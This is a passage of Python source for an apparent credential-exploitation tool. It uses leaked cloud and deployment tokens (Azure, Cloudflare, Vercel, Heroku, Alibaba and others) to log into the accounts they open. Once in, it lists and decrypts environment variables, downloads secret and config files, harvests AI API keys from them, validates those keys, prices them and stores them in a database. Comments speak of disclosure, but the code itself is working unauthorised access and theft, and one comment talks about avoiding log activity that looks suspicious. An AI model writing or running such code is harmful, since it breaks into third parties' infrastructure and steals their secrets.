            containers = list(client.list_containers(timeout=10))
        except ClientAuthenticationError:
            return {"error": "invalid_token"}
        except HttpResponseError as e:
            return {"error": f"http:{e.status_code or '?'}", "msg": str(e)[:120]}
        except Exception as e:
            return {"error": f"list:{type(e).__name__}", "msg": str(e)[:120]}

        out["containers_count"] = len(containers)

        for cont in containers[:20]:
            cname = cont.name
            try:
                container_client = client.get_container_client(cname)
                # List up to 200 blobs per container
                for blob in container_client.list_blobs(results_per_page=200, timeout=10):
                    bn = blob.name
                    bn_low = bn.lower()
                    # Filter blob names — only download those that look like config/secret
                    if not any(p in bn_low for p in (
                        ".env", "secret", "config", "credential", "token", "key",
                        "settings", "app.json", ".cfg", ".ini", ".yaml", ".yml",
                        ".toml", ".json", ".pem", "vault",
                    )):
                        continue
                    susp.append(f"{cname}/{bn}")
                    if out["blobs_sampled"] >= 50:
                        continue   # cap downloads but keep listing names
                    try:
                        blob_client = container_client.get_blob_client(bn)
                        # Cap download at 256 KB
                        data = blob_client.download_blob(max_concurrency=1, length=262144).readall()
                        out["blobs_sampled"] += 1
                        text = data.decode("utf-8", errors="replace")
                        text_blob.append(text)
                    except Exception:
                        pass
                    if len(susp) >= 100:
                        break
            except Exception:
                continue

        out["suspicious_tables"] = susp[:30]
        counts, previews, raw = _scan_text("\n".join(text_blob))
        out["ai_keys_found"] = counts
        out["ai_keys_total"] = sum(counts.values())
        out["previews"] = previews
        out["_raw_keys"] = raw
        return out

    try:
        result = await asyncio.to_thread(_do_sync)
        if isinstance(result, dict) and "_raw_keys" in result:
            raw = result.pop("_raw_keys")
            validated, validated_pairs = await _validate_discovered_keys(raw)
            result["ai_keys_validated"] = validated
            result["ai_keys_total_valid"] = sum(validated.values())
            result["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
            result["_validated_pairs"] = validated_pairs
        return result
    except Exception as e:
        return {"error": f"unhandled:{type(e).__name__}", "msg": str(e)[:120]}


# ── Cloudflare probe ────────────────────────────────────────────────────────
# Extracts API token, verifies it, lists zones + workers + their env vars.
# Workers env vars often contain user OPENAI_API_KEY etc.

async def probe_cloudflare(token: str) -> dict:
    import httpx as _httpx
    out: dict[str, Any] = {
        "probe_type": "cloudflare",
        "zones_count": 0,
        "workers_count": 0,
        "suspicious_tables": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }
    text_blob: list[str] = []
    susp: list[str] = []

    headers = {"Authorization": f"Bearer {token}",
               "Content-Type": "application/json"}
    base = "https://api.cloudflare.com/client/v4"

    async with _httpx.AsyncClient(timeout=12, follow_redirects=True) as c:
        try:
            r = await c.get(f"{base}/user/tokens/verify", headers=headers)
            if r.status_code == 401:
                return {"error": "invalid_token"}
            if r.status_code != 200:
                return {"error": f"http:{r.status_code}", "msg": r.text[:120]}
            j = r.json()
            if not j.get("success"):
                return {"error": "verify_failed"}
        except Exception as e:
            return {"error": f"verify:{type(e).__name__}", "msg": str(e)[:120]}

        # Account discovery
        try:
            r = await c.get(f"{base}/accounts", headers=headers)
            accounts = (r.json() or {}).get("result", [])
        except Exception:
            accounts = []

        for acc in accounts[:5]:
            acc_id = acc.get("id")
            if not acc_id:
                continue
            # Workers — most valuable: list scripts, get bindings (env vars)
            try:
                r = await c.get(f"{base}/accounts/{acc_id}/workers/scripts",
                                headers=headers)
                workers = (r.json() or {}).get("result", [])
                out["workers_count"] += len(workers)
                for w in workers[:30]:
                    wname = w.get("id") or w.get("name", "")
                    susp.append(f"worker:{wname}")
                    # Get bindings (KV, secrets, env vars)
                    try:
                        rb = await c.get(
                            f"{base}/accounts/{acc_id}/workers/scripts/{wname}/settings",
                            headers=headers,
                        )
                        if rb.status_code == 200:
                            text_blob.append(rb.text)
                    except Exception:
                        pass
            except Exception:
                pass

            # Pages projects (often have env vars)
            try:
                r = await c.get(f"{base}/accounts/{acc_id}/pages/projects",
                                headers=headers)
                projects = (r.json() or {}).get("result", [])
                for p in projects[:30]:
                    pname = p.get("name", "")
                    susp.append(f"pages:{pname}")
                    # deployment_configs.production.env_vars contains live env
                    text_blob.append(json.dumps(p.get("deployment_configs", {}),
                                                  default=str))
            except Exception:
                pass

        # Zones (less directly valuable but counts as active surface)
        try:
            r = await c.get(f"{base}/zones?per_page=50", headers=headers)
            zones = (r.json() or {}).get("result", [])
            out["zones_count"] = len(zones)
        except Exception:
            pass

    out["suspicious_tables"] = susp[:30]
    counts, previews, raw = _scan_text("\n".join(text_blob))
    out["ai_keys_found"] = counts
    out["ai_keys_total"] = sum(counts.values())
    out["previews"] = previews
    validated, validated_pairs = await _validate_discovered_keys(raw)
    out["ai_keys_validated"] = validated
    out["ai_keys_total_valid"] = sum(validated.values())
    out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
    out["_validated_pairs"] = validated_pairs
    return out


# ── Vercel probe ────────────────────────────────────────────────────────────

async def probe_vercel(token: str) -> dict:
    import httpx as _httpx
    out: dict[str, Any] = {
        "probe_type": "vercel",
        "projects_count": 0,
        "env_vars_total": 0,
        "suspicious_tables": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }
    text_blob: list[str] = []
    susp: list[str] = []
    headers = {"Authorization": f"Bearer {token}"}

    async with _httpx.AsyncClient(timeout=12) as c:
        try:
            r = await c.get("https://api.vercel.com/v2/user", headers=headers)
            if r.status_code == 401 or r.status_code == 403:
                return {"error": "invalid_token"}
            if r.status_code != 200:
                return {"error": f"http:{r.status_code}", "msg": r.text[:120]}
        except Exception as e:
            return {"error": f"verify:{type(e).__name__}", "msg": str(e)[:120]}

        # List projects
        try:
            r = await c.get("https://api.vercel.com/v9/projects?limit=100",
                            headers=headers)
            projects = (r.json() or {}).get("projects", [])
            out["projects_count"] = len(projects)
        except Exception:
            projects = []

        for p in projects[:50]:
            pid = p.get("id")
            pname = p.get("name", "")
            if not pid:
                continue
            try:
                r = await c.get(
                    f"https://api.vercel.com/v9/projects/{pid}/env?decrypt=true",
                    headers=headers,
                )
                if r.status_code != 200:
                    continue
                envs = (r.json() or {}).get("envs", [])
                out["env_vars_total"] += len(envs)
                for e in envs:
                    ename = e.get("key", "")
                    if _SUSPICIOUS_NAME.search(ename):
                        susp.append(f"{pname}:{ename}")
                    val = e.get("value")
                    if val:
                        text_blob.append(f"{ename}={val}")
            except Exception:
                pass

    out["suspicious_tables"] = susp[:30]
    counts, previews, raw = _scan_text("\n".join(text_blob))
    out["ai_keys_found"] = counts
    out["ai_keys_total"] = sum(counts.values())
    out["previews"] = previews
    validated, validated_pairs = await _validate_discovered_keys(raw)
    out["ai_keys_validated"] = validated
    out["ai_keys_total_valid"] = sum(validated.values())
    out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
    out["_validated_pairs"] = validated_pairs
    return out


# ── Generic infra-token probes (Heroku, Fly, Netlify, DigitalOcean, …) ───────

# Each entry: provider → (verify_url, header_template, list_endpoints).
# verify_url is GET-able and returns 401 on dead keys; the list_endpoints
# return JSON we scan for AI keys.
_GENERIC_INFRA: dict[str, dict] = {
    "heroku": {
        "verify": "https://api.heroku.com/account",
        "headers": lambda t: {"Authorization": f"Bearer {t}",
                              "Accept": "application/vnd.heroku+json; version=3"},
        "lists": [
            "https://api.heroku.com/apps",                 # list apps
            # then per-app /apps/{id}/config-vars (handled inline below)
        ],
        "per_app": {
            "list_url": "https://api.heroku.com/apps",
            "name_field": "name",
            "child_url": "https://api.heroku.com/apps/{name}/config-vars",
        },
    },
    "fly": {
        "verify": "https://api.fly.io/graphql",
        "headers": lambda t: {"Authorization": f"Bearer {t}"},
        "lists": [],
        "graphql": {
            "url": "https://api.fly.io/graphql",
            "query": '{"query":"query { apps { nodes { name secrets { name digest } } } }"}',
        },
    },
    "netlify": {
        "verify": "https://api.netlify.com/api/v1/user",
        "headers": lambda t: {"Authorization": f"Bearer {t}"},
        "lists": [],
        "per_app": {
            "list_url": "https://api.netlify.com/api/v1/sites",
            "name_field": "id",
            "child_url": "https://api.netlify.com/api/v1/sites/{name}/env",
        },
    },
    "digitalocean": {
        "verify": "https://api.digitalocean.com/v2/account",
        "headers": lambda t: {"Authorization": f"Bearer {t}"},
        "lists": [
            "https://api.digitalocean.com/v2/apps",
            "https://api.digitalocean.com/v2/databases",
        ],
    },
    "linode": {
        "verify": "https://api.linode.com/v4/account",
        "headers": lambda t: {"Authorization": f"Bearer {t}"},
        "lists": ["https://api.linode.com/v4/databases/instances"],
    },
    "hetzner": {
        "verify": "https://api.hetzner.cloud/v1/servers",
        "headers": lambda t: {"Authorization": f"Bearer {t}"},
        "lists": ["https://api.hetzner.cloud/v1/servers"],
    },
    "vultr": {
        "verify": "https://api.vultr.com/v2/account",
        "headers": lambda t: {"Authorization": f"Bearer {t}"},
        "lists": ["https://api.vultr.com/v2/instances"],
    },
    "doppler": {
        "verify": "https://api.doppler.com/v3/me",
        "headers": lambda t: {"Authorization": f"Bearer {t}"},
        "lists": [],
        "per_app": {
            "list_url": "https://api.doppler.com/v3/projects",
            "name_field": "id",
            "child_url": "https://api.doppler.com/v3/configs/config/secrets/download?project={name}&config=prd&format=json",
        },
    },
    "railway": {
        "verify": "https://backboard.railway.app/graphql/v2",
        "headers": lambda t: {"Authorization": f"Bearer {t}"},
        "lists": [],
        "graphql": {
            "url": "https://backboard.railway.app/graphql/v2",
            "query": '{"query":"query { me { projects { edges { node { id name services { edges { node { id name variables { edges { node { name value } } } } } } } } } } }"}',
        },
    },
    "supabase": {
        "verify": "https://api.supabase.com/v1/projects",
        "headers": lambda t: {"Authorization": f"Bearer {t}"},
        "lists": ["https://api.supabase.com/v1/projects"],
        "per_app": {
            "list_url": "https://api.supabase.com/v1/projects",
            "name_field": "id",
            "child_url": "https://api.supabase.com/v1/projects/{name}/secrets",
        },
    },
    "vault": {  # HashiCorp Vault — needs VAULT_ADDR (skip generic, special-case)
        "verify": None,
    },
    "tfc": {    # Terraform Cloud
        "verify": "https://app.terraform.io/api/v2/account/details",
        "headers": lambda t: {"Authorization": f"Bearer {t}",
                              "Content-Type": "application/vnd.api+json"},
        "lists": ["https://app.terraform.io/api/v2/organizations"],
    },
}


async def probe_generic_infra(provider: str, token: str) -> dict:
    """Generic verify+enum for deploy/infra tokens. Returns probe_type
    set to provider name."""
    import httpx as _httpx
    cfg = _GENERIC_INFRA.get(provider)
    if not cfg or not cfg.get("verify"):
        return {"probe_type": provider, "skipped": "unsupported_provider"}

    out: dict[str, Any] = {
        "probe_type": provider,
        "suspicious_tables": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }
    text_blob: list[str] = []
    susp: list[str] = []
    headers = cfg["headers"](token)

    async with _httpx.AsyncClient(timeout=12, follow_redirects=True) as c:
        try:
            r = await c.get(cfg["verify"], headers=headers)
            if r.status_code in (401, 403):
                return {"error": "invalid_token", "code": r.status_code}
            if r.status_code >= 500:
                return {"error": f"server:{r.status_code}"}
            if r.status_code != 200:
                return {"error": f"http:{r.status_code}", "msg": r.text[:120]}
        except Exception as e:
            return {"error": f"verify:{type(e).__name__}", "msg": str(e)[:120]}

        # Top-level lists
        for url in cfg.get("lists", []):
            try:
                r = await c.get(url, headers=headers)
                if r.status_code == 200:
                    text_blob.append(r.text)
                    susp.append(url.split("/")[-1])
            except Exception:
                pass

        # GraphQL queries
        gq = cfg.get("graphql")
        if gq:
            try:
                r = await c.post(gq["url"], headers=headers, content=gq["query"])
                if r.status_code == 200:
                    text_blob.append(r.text)
                    susp.append("graphql:variables")
            except Exception:
                pass

        # Per-app drill-down
        per_app = cfg.get("per_app")
        if per_app:
            try:
                r = await c.get(per_app["list_url"], headers=headers)
                if r.status_code == 200:
                    j = r.json()
                    items = j if isinstance(j, list) else (
                        j.get("apps") or j.get("sites") or j.get("projects") or
                        j.get("data") or j.get("data", {}).get("apps", []) or []
                    )
                    name_field = per_app["name_field"]
                    for it in (items or [])[:20]:
                        if not isinstance(it, dict):
                            continue
                        name = it.get(name_field)
                        if not name:
                            continue
                        url = per_app["child_url"].replace("{name}", str(name))
                        try:
                            rc = await c.get(url, headers=headers)
                            if rc.status_code == 200:
                                text_blob.append(rc.text)
                                susp.append(f"{provider}:{name}")
                        except Exception:
                            pass
            except Exception:
                pass

    out["suspicious_tables"] = susp[:30]
    counts, previews, raw = _scan_text("\n".join(text_blob))
    out["ai_keys_found"] = counts
    out["ai_keys_total"] = sum(counts.values())
    out["previews"] = previews
    validated, validated_pairs = await _validate_discovered_keys(raw)
    out["ai_keys_validated"] = validated
    out["ai_keys_total_valid"] = sum(validated.values())
    out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
    out["_validated_pairs"] = validated_pairs
    return out


# ── Alibaba Cloud probe (OSS list, RAM enum) ────────────────────────────────

_ALI_REGIONS = ["cn-hangzhou", "cn-shanghai", "cn-beijing", "ap-southeast-1"]


def _ali_signed_request_headers(method: str, host: str, path: str,
                                 access_key_id: str, access_key_secret: str) -> dict:
    """Build minimal signed headers for OSS GetService (list buckets)."""
    import hmac, hashlib as _hl, base64 as _b64
    from email.utils import formatdate
    date_hdr = formatdate(usegmt=True)
    string_to_sign = f"{method}\n\n\n{date_hdr}\n/"
    sig = _b64.b64encode(
        hmac.new(access_key_secret.encode(), string_to_sign.encode(),
                  _hl.sha1).digest()
    ).decode()
    return {
        "Date": date_hdr,
        "Authorization": f"OSS {access_key_id}:{sig}",
        "Host": host,
    }


async def probe_alibaba(cred: str) -> dict:
    """Probe Alibaba Cloud: list OSS buckets, sample suspicious-named blobs.
    cred format from extract_alibaba: 'LTAI...:secret@region'."""
    import httpx as _httpx

    m = re.match(r"^(LTAI[A-Za-z0-9]+|STS\.[A-Za-z0-9]+):([^@]+)@?(.*)?", cred)
    if not m:
        return {"error": "format"}
    kid = m.group(1)
    secret = m.group(2)
    if "secret_unknown" in secret or len(secret) < 20:
        return {"error": "secret_missing"}

    out: dict[str, Any] = {
        "probe_type": "alibaba",
        "buckets_count": 0,
        "regions_probed": [],
        "suspicious_tables": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }
    text_blob: list[str] = []
    susp: list[str] = []

    async with _httpx.AsyncClient(timeout=12) as c:
        # OSS list buckets — try regions
        for region in _ALI_REGIONS:
            host = f"oss-{region}.aliyuncs.com"
            url = f"https://{host}/"
            headers = _ali_signed_request_headers("GET", host, "/", kid, secret)
            try:
                r = await c.get(url, headers=headers)
            except Exception:
                continue
            if r.status_code == 403 and "InvalidAccessKeyId" in (r.text or ""):
                return {"error": "invalid_token"}
            if r.status_code != 200:
                continue
            out["regions_probed"].append(region)
            # Parse bucket names from XML
            for bm in re.finditer(r"<Name>([^<]+)</Name>", r.text):
                bname = bm.group(1)
                susp.append(f"oss:{bname}")
                out["buckets_count"] += 1
                # Try listing blobs in this bucket (cap to first 5 buckets)
                if len([s for s in susp if s.startswith("oss:")]) > 5:
                    continue
                bhost = f"{bname}.{host}"
                try:
                    bheaders = _ali_signed_request_headers("GET", bhost, "/",
                                                           kid, secret)
                    rb = await c.get(f"https://{bhost}/?max-keys=100",
                                     headers=bheaders)
                    if rb.status_code == 200:
                        # Find suspicious-named keys
                        for km in re.finditer(r"<Key>([^<]+)</Key>", rb.text):
                            kn = km.group(1)
                            if any(p in kn.lower() for p in
                                   (".env", "secret", "config", "credential",
                                    "key", "token")):
                                susp.append(f"oss:{bname}/{kn}")
                                # Download (cap 256KB)
                                try:
                                    do_url = f"https://{bhost}/{kn}"
                                    do_h = _ali_signed_request_headers(
                                        "GET", bhost, f"/{kn}", kid, secret)
                                    rd = await c.get(do_url, headers=do_h)
                                    if rd.status_code == 200:
                                        text_blob.append(rd.text[:262144])
                                except Exception:
                                    pass
                except Exception:
                    pass
            # Found something — no need to continue regions
            if out["buckets_count"] > 0:
                break

    out["suspicious_tables"] = susp[:30]
    counts, previews, raw = _scan_text("\n".join(text_blob))
    out["ai_keys_found"] = counts
    out["ai_keys_total"] = sum(counts.values())
    out["previews"] = previews
    validated, validated_pairs = await _validate_discovered_keys(raw)
    out["ai_keys_validated"] = validated
    out["ai_keys_total_valid"] = sum(validated.values())
    out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
    out["_validated_pairs"] = validated_pairs
    return out


# ── Detect provider from infra-token cred ───────────────────────────────────
# Cred format from extract_infra: "<ENV_NAME>=<value>"
# Map env var prefix → generic provider.

_INFRA_TOKEN_PROVIDER: list[tuple[re.Pattern, str]] = [
    (re.compile(r'^CLOUDFLARE_|^CF_API'),                   "cloudflare"),
    (re.compile(r'^VERCEL_'),                                "vercel"),
    (re.compile(r'^HEROKU_'),                                "heroku"),
    (re.compile(r'^FLY_'),                                   "fly"),
    (re.compile(r'^NETLIFY_'),                               "netlify"),
    (re.compile(r'^DIGITALOCEAN_|^DO_ACCESS'),              "digitalocean"),
    (re.compile(r'^LINODE_'),                                "linode"),
    (re.compile(r'^HETZNER_|^HCLOUD_'),                     "hetzner"),
    (re.compile(r'^VULTR_'),                                 "vultr"),
    (re.compile(r'^DOPPLER_'),                               "doppler"),
    (re.compile(r'^RAILWAY_'),                               "railway"),
    (re.compile(r'^SUPABASE_(?:ACCESS_TOKEN|SERVICE_ROLE_KEY|API_TOKEN)'), "supabase"),
    (re.compile(r'^TFC_|^TERRAFORM_CLOUD|^TFE_'),           "tfc"),
]


def _detect_infra_provider(cred: str) -> tuple[str, str] | None:
    """Returns (provider, token_value) or None."""
    if "=" not in cred:
        return None
    env_name, _, value = cred.partition("=")
    env_name = env_name.strip().upper()
    value = value.strip().strip('"').strip("'")
    for pat, prov in _INFRA_TOKEN_PROVIDER:
        if pat.match(env_name):
            return prov, value
    return None


# ── SSH probe (lightweight: structural + banner only, no shell) ────────────

async def probe_ssh(cred: str) -> dict:
    """SSH probe — DELIBERATELY MINIMAL. We only:
      1. Structurally validate the PEM/OpenSSH key parses
      2. Optionally derive fingerprint
    We DO NOT establish a shell, run commands, or read files on the remote
    system — that would be active intrusion. The owner can be informed
    'a working SSH key was found in your repo' which is actionable on its own.
    """
    out: dict[str, Any] = {
        "probe_type": "ssh",
        "key_type": "",
        "fingerprint": "",
        "suspicious_tables": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }
    if "BEGIN" not in cred:
        return {"error": "not_pem"}
    try:
        from cryptography.hazmat.primitives.serialization import (
            load_pem_private_key, load_ssh_private_key,
        )
        from cryptography.hazmat.primitives import hashes, serialization
    except ImportError:
        return {"error": "cryptography_missing"}

    try:
        key = await asyncio.to_thread(load_pem_private_key, cred.encode(), None)
    except Exception:
        try:
            key = await asyncio.to_thread(load_ssh_private_key, cred.encode(), None)
        except Exception:
            return {"error": "key_parse_failed"}

    out["key_type"] = type(key).__name__
    try:
        pub = key.public_key().public_bytes(
            encoding=serialization.Encoding.OpenSSH,
            format=serialization.PublicFormat.OpenSSH,
        )
        h = hashes.Hash(hashes.SHA256())
        h.update(pub)
        import base64 as _b64
        out["fingerprint"] = "SHA256:" + _b64.b64encode(h.finalize()).decode().rstrip("=")
    except Exception:
        pass
    return out


# ── Dispatcher ──────────────────────────────────────────────────────────────

async def probe_one(cred_type: str, cred: str) -> dict:
    """Returns probe result. Adds reachability_check + connect_route on top."""
    # Reachability + route detection (uses Evomi fallback)
    parsed = None
    try:
        parsed = urlparse(cred) if "://" in cred else None
    except Exception:
        parsed = None

    route = ""
    if parsed and parsed.hostname:
        port = parsed.port or _default_port(parsed.scheme)
        ok, route = await reachability_check(parsed.hostname, port)
        if not ok:
            return {"error": "unreachable", "connect_route": ""}
        if route.startswith("proxy:"):
            # Skip jackpot probe — we'd need DB-protocol-aware proxy
            return {"connect_route": route, "skipped": "proxy_only"}

    if cred_type == "database":
        scheme = (parsed.scheme if parsed else "").split("+")[0].lower()
        if scheme.startswith("postgres"):
            data = await probe_postgres(cred)
        elif scheme in ("mongodb", "mongodb+srv"):
            data = await probe_mongo(cred)
        elif scheme.startswith("redis"):
            data = await probe_redis(cred)
        elif scheme in ("mysql", "mariadb"):
            data = await probe_mysql(cred)
        else:
            data = {"probe_type": scheme, "skipped": "unsupported_scheme"}
    elif cred_type == "aws":
        data = await probe_aws(cred)
    elif cred_type == "azure":
        data = await probe_azure(cred)
    elif cred_type == "alibaba":
        data = await probe_alibaba(cred)
    elif cred_type == "ssh":
        data = await probe_ssh(cred)
    elif cred_type == "infra":
        # Detect provider from env-name, route to specific probe
        detected = _detect_infra_provider(cred)
        if not detected:
            data = {"probe_type": "infra_unknown", "skipped": "unknown_provider"}
        else:
            provider, token = detected
            if provider == "cloudflare":
                data = await probe_cloudflare(token)
            elif provider == "vercel":
                data = await probe_vercel(token)
            else:
                data = await probe_generic_infra(provider, token)
    else:
        data = {"probe_type": cred_type, "skipped": "type_not_implemented"}

    data["connect_route"] = route or "direct"
    if "score" not in data and "error" not in data:
        data["score"] = _compute_jackpot_score(data.get("probe_type", ""), data)
    return data


def _default_port(scheme: str) -> int:
    s = (scheme or "").lower().split("+")[0]
    return {
        "postgres": 5432, "postgresql": 5432,
        "mongodb": 27017, "mongodb+srv": 27017,
        "redis": 6379, "rediss": 6380,
        "mysql": 3306, "mariadb": 3306,
    }.get(s, 5432)


# ── Cycle runner ────────────────────────────────────────────────────────────

def _dedup_host_key(cred_type: str, cred: str) -> str:
    """Identifier used to dedupe per-host probes within one cycle.
    For DSNs: host:port. For AWS: AKID. For others: cred-prefix."""
    if cred_type == "aws":
        m = re.match(r"^(AKIA[A-Z0-9]+|ASIA[A-Z0-9]+|AKIAJ[A-Z0-9]+):", cred)
        return f"aws:{m.group(1)}" if m else f"aws:{cred[:24]}"
    try:
        p = urlparse(cred)
        if p.hostname:
            return f"{cred_type}:{p.hostname.lower()}:{p.port or 0}"
    except Exception:
        pass
    return f"{cred_type}:{cred[:32]}"


async def run_jackpot_cycle(limit: int | None = None,
                              only_unprobed: bool = False) -> dict:
    """Probe is_validated=1 rows in infra_findings. Updates jackpot_data,
    jackpot_score, connect_route columns. Returns aggregate counts.

    only_unprobed=True restricts to rows that don't have jackpot_data yet
    (used by the auto-jackpot loop in main.py to avoid re-probing already-
    investigated infra each hour).

    Adds:
      • Per-host dedup — multiple validated rows pointing at the same
        host:port get probed ONCE per cycle (saves CloudTrail noise + avoids
        triple-tapping the same DB which looks suspicious in logs).
      • Save validated AI keys discovered INSIDE infra to found_keys table
        so the operator can retrieve raw keys for verification + the rotation
        proxy + revalidation loop pick them up. Source tag:
        file_type='infra_jackpot:{probe_type}', repo=<infra_finding.repo>,
        file_url=<infra_finding.file_url>.
    """
    import sqlite3
    import db as _dbmod
    from config import DB_PATH
    from notifier import notify_found

    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    where = "is_validated=1"
    if only_unprobed:
        where += " AND (jackpot_data IS NULL OR jackpot_data='')"
    rows = conn.execute(
        f"SELECT id, cred_type, cred_full, repo, file_url, file_path,"
        f" repo_stars, repo_created"
        f" FROM infra_findings WHERE {where} ORDER BY id DESC"
        + (f" LIMIT {int(limit)}" if limit else "")
    ).fetchall()
    conn.close()

    log.info("jackpot: probing %d validated infra rows", len(rows))
    sem = asyncio.Semaphore(10)
    results: dict[int, dict] = {}
    probed_hosts: dict[str, dict] = {}     # dedup cache: host_key -> probe result
    probed_lock = asyncio.Lock()

    async def _one(r):
        host_key = _dedup_host_key(r["cred_type"], r["cred_full"] or "")
        # Fast-path: if same host already probed in THIS cycle, reuse result
        async with probed_lock:
            cached = probed_hosts.get(host_key)
        if cached is not None:
            results[r["id"]] = {**cached, "_dedup_from": host_key}
            return
        async with sem:
            try:
                d = await probe_one(r["cred_type"], r["cred_full"] or "")
            except Exception as e:
                d = {"error": f"probe_crash:{type(e).__name__}", "msg": str(e)[:120]}
        async with probed_lock:
            probed_hosts[host_key] = d
        results[r["id"]] = d

    await asyncio.gather(*(_one(r) for r in rows), return_exceptions=True)

    # Build a id→row map for save context
    row_by_id = {r["id"]: r for r in rows}

    counters = {
        "total": len(rows),
        "probed": 0,
        "errors": 0,
        "via_proxy": 0,
        "deduped": 0,                  # rows that reused a sibling-cred result
        "with_keys": 0,
        "with_validated_keys": 0,
        "total_keys_found": 0,
        "total_validated_keys": 0,
        "saved_to_found_keys": 0,       # NEW: rows actually persisted
        "total_estimated_exposure_usd": 0,
        "by_provider": {},
        "by_provider_validated": {},
        "jackpot_critical": 0,   # score >= 60 → top disclosure targets
        "jackpot_severe":   0,   # score >= 80 → JACKPOT-tier
    }
    # First pass: persist validated keys → found_keys, BEFORE we strip _validated_pairs
    # for the JSON serialization of jackpot_data. Done outside the per-row loop so
    # the save_key calls don't bottleneck the UPDATE pass on jackpot_data.
    saved_now: list[tuple[str, str, str, str, str]] = []   # (provider, key, repo, file_path, file_url)
    for row_id, data in results.items():
        pairs = data.pop("_validated_pairs", []) if isinstance(data, dict) else []
        if not pairs:
            continue
        src = row_by_id.get(row_id)
        if src is None:
            continue
        probe_type = data.get("probe_type", "infra")
        # repo = original infra_finding.repo (where the cred was found in code)
        # Tagging file_type='infra_jackpot:{type}' so reports/UI can filter
        # disclosure-grade keys (live, came from inside reachable infra) vs
        # the broader found_keys pool.
        for provider, key in pairs:
            saved_now.append((
                provider, key,
                src["repo"] or "infra_jackpot",
                f"(in_infra:{probe_type})",
                src["file_url"] or "",
            ))

    saved_count = 0
    for provider, key, repo, file_path, file_url in saved_now:
        if _dbmod.key_exists(key):
            continue
        try:
            ok = _dbmod.save_key(
                provider, key, repo, file_path, file_url,
                0, "", f"infra_jackpot", True,
            )
            if ok:
                saved_count += 1
                # Async notify (best-effort)
                try:
                    await notify_found(
                        provider, key, repo, file_path, file_url,
                        0, "", f"infra_jackpot", True,
                    )
                except Exception:
                    pass
        except Exception as e:
            log.debug("save_key (jackpot) err: %s", e)
    counters["saved_to_found_keys"] = saved_count
    log.info("jackpot: saved %d new validated keys to found_keys", saved_count)

    conn = sqlite3.connect(DB_PATH)
    try:
        for row_id, data in results.items():
            if data.get("_dedup_from"):
                counters["deduped"] += 1
            if "error" in data and data["error"] not in ("auth_partial",):
                counters["errors"] += 1
                conn.execute(
                    "UPDATE infra_findings SET jackpot_data=?, jackpot_score=?, "
                    "connect_route=? WHERE id=?",
                    (json.dumps(data, ensure_ascii=False, default=str)[:12000],
                     0, data.get("connect_route", ""), row_id),
                )
                continue
            counters["probed"] += 1
            route = data.get("connect_route", "")
            if route.startswith("proxy:"):
                counters["via_proxy"] += 1
            keys_found = data.get("ai_keys_total", 0)
            keys_valid = data.get("ai_keys_total_valid", 0)
            if keys_found > 0:
                counters["with_keys"] += 1
                counters["total_keys_found"] += keys_found
                for prov, n in (data.get("ai_keys_found") or {}).items():
                    counters["by_provider"][prov] = (
                        counters["by_provider"].get(prov, 0) + n
                    )
            if keys_valid > 0:
                counters["with_validated_keys"] += 1
                counters["total_validated_keys"] += keys_valid
                for prov, n in (data.get("ai_keys_validated") or {}).items():
                    counters["by_provider_validated"][prov] = (
                        counters["by_provider_validated"].get(prov, 0) + n
                    )
                counters["total_estimated_exposure_usd"] += int(
                    data.get("estimated_exposure_usd", 0) or 0
                )
            # Recompute score with populated validated counts
            data["score"] = _compute_jackpot_score(data.get("probe_type", ""), data)
            score = data["score"]
            if score >= 60:
                counters["jackpot_critical"] += 1
            if score >= 80:
                counters["jackpot_severe"] += 1
            conn.execute(
                "UPDATE infra_findings SET jackpot_data=?, jackpot_score=?, "
                "connect_route=? WHERE id=?",
                (json.dumps(data, ensure_ascii=False, default=str)[:12000],
                 score, route, row_id),
            )
        conn.commit()
    finally:
        conn.close()

    log.info("jackpot cycle done: %s", counters)
    return counters
